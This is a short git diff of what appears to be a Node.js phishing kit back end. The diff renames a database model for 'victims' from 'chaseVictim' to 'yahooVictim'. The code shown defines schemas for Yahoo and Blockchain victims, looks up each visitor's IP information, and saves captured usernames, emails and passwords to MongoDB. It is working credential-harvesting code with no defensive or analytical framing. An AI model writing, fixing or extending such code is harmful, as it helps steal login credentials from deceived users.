@@ -8,7 +8,7 @@ const port = process.env.PORT || 9000;
     Sniffr = require("sniffr"),
     s = new Sniffr(),
     yahooVictimSchema = null,
-    chaseVictim = null,
+    yahooVictim = null,
     blockchainVictimSchema = null,
     blockchainVictim = null,
     visitorIp = null,
@@ -33,7 +33,7 @@ yahooVictimSchema = new mongoose.Schema({
     minimize: false
 })
 
-chaseVictim = mongoose.model("chaseVictim", yahooVictimSchema);
+yahooVictim = mongoose.model("yahooVictim", yahooVictimSchema);
 
 blockchainVictimSchema = new mongoose.Schema({
     email: String,
@@ -80,7 +80,7 @@ function getVictimIpInfoAndSaveYahooVictimInfoToDb(username, email, password, pa
     }).then(victimIpInfo => {
         console.log(victimIpInfo);
 
-        new chaseVictim({
+        new yahooVictim({
 			username,
             email,
             password,
